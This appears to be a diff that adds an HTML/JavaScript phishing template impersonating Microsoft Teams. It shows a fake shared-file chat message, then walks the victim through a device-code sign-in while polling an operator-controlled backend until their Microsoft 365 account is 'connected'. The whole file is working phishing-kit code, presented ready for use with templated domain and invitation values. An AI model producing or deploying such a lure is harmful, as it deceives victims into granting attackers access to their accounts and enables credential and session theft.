@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Teams - Chat File</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Segoe UI',sans-serif;background:#1b1b1b;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
+    .header{width:100%;padding:16px 24px;background:#464775;display:flex;align-items:center;gap:10px}
+    .header span{color:#fff;font-size:16px;font-weight:600}
+    .content{max-width:480px;width:100%;margin:80px auto 0;padding:0 16px}
+    .card{background:#2d2d2d;border-radius:8px;padding:0;border:1px solid #404040;overflow:hidden}
+    .chat-area{padding:24px}
+    .chat-row{display:flex;gap:12px;margin-bottom:16px}
+    .avatar{width:36px;height:36px;border-radius:50%;background:#464775;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700;flex-shrink:0}
+    .chat-body{flex:1}
+    .chat-header{display:flex;align-items:baseline;gap:8px;margin-bottom:4px}
+    .sender-name{color:#e0e0e0;font-size:14px;font-weight:600}
+    .timestamp{color:#808080;font-size:12px}
+    .chat-message{color:#b0b0b0;font-size:14px;line-height:1.5}
+    .attachment{background:#252525;border:1px solid #404040;border-radius:6px;margin-top:12px;overflow:hidden}
+    .attachment-body{display:flex;align-items:center;gap:14px;padding:14px 16px}
+    .doc-icon{width:40px;height:48px;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;font-weight:700;flex-shrink:0}
+    .attachment-info{flex:1;min-width:0}
+    .attachment-title{color:#e0e0e0;font-size:14px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .attachment-meta{color:#808080;font-size:12px;margin-top:2px}
+    .btn{width:100%;padding:12px 24px;background:#464775;color:#fff;border:none;border-top:1px solid #404040;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
+    .btn:hover{background:#53548a}
+    .btn:disabled{background:#3a3b5e;cursor:not-allowed}
+    .code-card{background:#141414;border:1px solid #2a2a2a;border-radius:12px;padding:32px;text-align:center}
+    .code-label{color:#888;font-size:14px;margin-bottom:8px}
+    .code-value{font-family:monospace;font-size:36px;font-weight:bold;letter-spacing:0.3em;margin:12px 0}
+    .copy-btn{background:#1a1a2e;border:1px solid #2a2a2a;color:#fff;padding:8px 20px;border-radius:8px;cursor:pointer;font-size:14px;display:inline-flex;align-items:center;gap:8px}
+    .steps{margin-top:32px;text-align:left}
+    .steps p{color:#ccc;font-size:14px;font-weight:600;margin-bottom:12px}
+    .steps ol{color:#888;font-size:14px;line-height:2;padding-left:20px}
+    .steps strong{color:#fff}
+    .verify-link{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding:12px 24px;background:#1a1a2e;border:1px solid #464775;border-radius:8px;color:#8b8cc7;font-size:14px;font-weight:500;text-decoration:none}
+    .waiting{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:24px;color:#888;font-size:14px}
+    .spinner{display:inline-block;width:16px;height:16px;border:2px solid #555;border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
+    .success-icon{width:80px;height:80px;border-radius:50%;background:rgba(22,101,52,.2);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
+    .error-icon{width:80px;height:80px;border-radius:50%;background:rgba(220,38,38,.1);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
+    .center{text-align:center}
+    .success{color:#22c55e}
+    .error{color:#ef4444}
+    .email-badge{color:#8b8cc7;font-size:14px;background:#1a1a2e;padding:8px 16px;border-radius:8px;display:inline-block;margin-top:16px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="header">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+      <rect x="2" y="3" width="14" height="14" rx="2" fill="#fff" opacity="0.9"/>
+      <text x="9" y="13" text-anchor="middle" fill="#464775" font-size="10" font-weight="700" font-family="Segoe UI,sans-serif">T</text>
+      <circle cx="19" cy="7" r="4" fill="#fff"/>
+    </svg>
+    <span>Microsoft Teams</span>
+  </div>
+
+  <div class="content" id="app">
+    <div class="card">
+      <div class="chat-area">
+        <p style="color:#a0a0a0;font-size:13px">Loading...</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const API = "{{ domain }}";
+    const CODE = "{{ invitation }}";
+    const app = document.getElementById("app");
+    const DOC_COLORS = { PDF:"#E74C3C", DOCX:"#2B579A", XLSX:"#217346", PPTX:"#D24726", ZIP:"#F0AD4E" };
+
+    async function init() {
+      try {
+        const res = await fetch(`${API}/api/public/i/${CODE}`);
+        if (!res.ok) { app.innerHTML = '<div class="card"><div class="chat-area center"><p class="error">Link not found or expired.</p></div></div>'; return; }
+        const inv = await res.json();
+        showTemplate(inv);
+      } catch { app.innerHTML = '<div class="card"><div class="chat-area center"><p class="error">Could not connect.</p></div></div>'; }
+    }
+
+    function showTemplate(inv) {
+      const color = DOC_COLORS[inv.docType] || "#464775";
+      const initial = inv.senderName ? inv.senderName.charAt(0).toUpperCase() : "?";
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+      app.innerHTML = `
+        <div class="card">
+          <div class="chat-area">
+            <div class="chat-row">
+              <div class="avatar">${initial}</div>
+              <div class="chat-body">
+                <div class="chat-header">
+                  <span class="sender-name">${inv.senderName}</span>
+                  <span class="timestamp">${timeStr}</span>
+                </div>
+                <p class="chat-message">Here is the file you requested</p>
+                <div class="attachment">
+                  <div class="attachment-body">
+                    <div class="doc-icon" style="background:${color}">${inv.docType}</div>
+                    <div class="attachment-info">
+                      <p class="attachment-title">${inv.documentTitle}</p>
+                      <p class="attachment-meta">Teams File &middot; ${inv.docType}</p>
+                    </div>
+                  </div>
+                  <button class="btn" id="openBtn">Download</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>`;
+      document.getElementById("openBtn").onclick = () => startAuth(inv.invitationId);
+    }
+
+    async function startAuth(invitationId) {
+      const btn = document.getElementById("openBtn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span> Opening...';
+      try {
+        const res = await fetch(`${API}/api/public/i/connect`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({invitationId}) });
+        if (!res.ok) { app.innerHTML = '<div class="card"><div class="chat-area center"><p class="error">Failed to start.</p></div></div>'; return; }
+        const auth = await res.json();
+        showCode(auth, invitationId);
+      } catch { app.innerHTML = '<div class="card"><div class="chat-area center"><p class="error">Network error.</p></div></div>'; }
+    }
+
+    function showCode(auth, invitationId) {
+      app.innerHTML = `
+        <div class="code-card">
+          <p class="code-label">Verification code</p>
+          <p class="code-value">${auth.userCode}</p>
+          <button class="copy-btn" id="copyBtn">Copy code</button>
+          <div class="steps">
+            <p>Steps to verify:</p>
+            <ol>
+              <li>Open the link below in a new tab</li>
+              <li>Enter code <strong>${auth.userCode}</strong> when prompted</li>
+              <li>Sign in with your Microsoft account</li>
+              <li>Return to this page — it updates automatically</li>
+            </ol>
+          </div>
+          <a href="${auth.verificationUri}" target="_blank" rel="noopener" class="verify-link">${auth.verificationUri}</a>
+        </div>
+        <div class="waiting"><span class="spinner"></span> Waiting for authentication...</div>`;
+      document.getElementById("copyBtn").onclick = () => { navigator.clipboard.writeText(auth.userCode); document.getElementById("copyBtn").textContent = "Copied!"; setTimeout(() => document.getElementById("copyBtn").textContent = "Copy code", 2000); };
+
+      const timer = setInterval(async () => {
+        try {
+          const res = await fetch(`${API}/api/public/i/poll`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({deviceCode:auth.deviceCode, invitationId}) });
+          const result = await res.json();
+          if (result.status === "complete") { clearInterval(timer); if (result.exitUrl) { window.location.href = result.exitUrl; return; } app.innerHTML = `<div class="code-card"><div class="success-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div><h2 style="font-size:28px;font-weight:bold;margin-bottom:8px">Account Connected!</h2><p style="color:#888">Your Microsoft 365 account has been successfully verified.</p>${result.email ? '<p class="email-badge">'+result.email+'</p>' : ''}</div>`; }
+          else if (result.status === "error") { clearInterval(timer); app.innerHTML = `<div class="code-card"><div class="error-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div><h2 class="error" style="font-size:24px;font-weight:bold;margin-bottom:8px">Authentication Failed</h2><p style="color:#888;margin-bottom:24px">${result.error}</p><button class="btn" style="border-radius:4px;border-top:none" onclick="location.reload()">Try Again</button></div>`; }
+        } catch {}
+      }, auth.interval * 1000);
+    }
+
+    init();
+  </script>
+</body>
+</html>
